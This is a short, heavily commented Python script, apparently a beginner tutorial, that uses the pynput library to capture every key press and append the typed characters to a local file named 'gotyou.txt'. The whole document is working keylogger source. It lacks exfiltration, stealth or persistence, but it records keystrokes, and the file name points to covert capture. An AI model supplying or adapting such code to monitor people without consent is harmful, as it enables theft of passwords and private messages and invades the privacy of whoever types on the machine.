# Import the keyboard module from the pynput library
from pynput import keyboard

# Define a function named keypressed that takes a parameter called key
def keypressed(key):
    # Print the value of the key parameter converted to a string
    print(str(key))
    
    # Open a file named "gotyou.txt" in append mode
    # "a" means append mode, which allows writing to the end of the file without overwriting existing content
    with open("gotyou.txt", "a") as logkey:
        try:
            # Try to access the char attribute of the key object
            char = key.char
            
            # Write the value of the char attribute to the "gotyou.txt" file
            logkey.write(char)
        except:
            # If an exception occurs (e.g., key does not have a char attribute), print an error message
            print("Error getting char") 

# If this script is executed directly (not imported as a module), execute the following:
if __name__ == "__main__":
    # Create a keyboard listener that calls the keypressed function when a key is pressed
    listener = keyboard.Listener(on_press=keypressed)
    
    # Start the keyboard listener
    listener.start()
    
    # Wait for user input (this keeps the program running until the user presses Enter)
    input()
